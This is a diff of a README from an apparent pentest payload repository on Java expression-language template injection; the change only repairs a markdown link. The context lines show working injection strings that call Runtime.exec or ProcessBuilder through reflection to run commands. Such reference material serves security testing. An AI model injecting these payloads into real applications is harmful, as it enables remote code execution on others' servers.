@@ -8,7 +8,7 @@ T(java.lang.Runtime).getRuntime().exec('calc')
 ''.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(<COMMAND STRING/ARRAY>)
 ''.class.forName('java.lang.ProcessBuilder').getDeclaredConstructors()[1].newInstance(<COMMAND ARRAY/LIST>).start()
 ```
-(for more see on [PayloadsAllTheThings]([https://duckduckgo.com](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#expression-language-el)) and [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#java))
+(for more see on [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#expression-language-el) and [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#java))
 
 You probably need to start think in another way and try gather and do as much as possible... 
 So, this repository was born from payloads developed during a regular web application pentest and several others written out of boredom, feel free to push more!
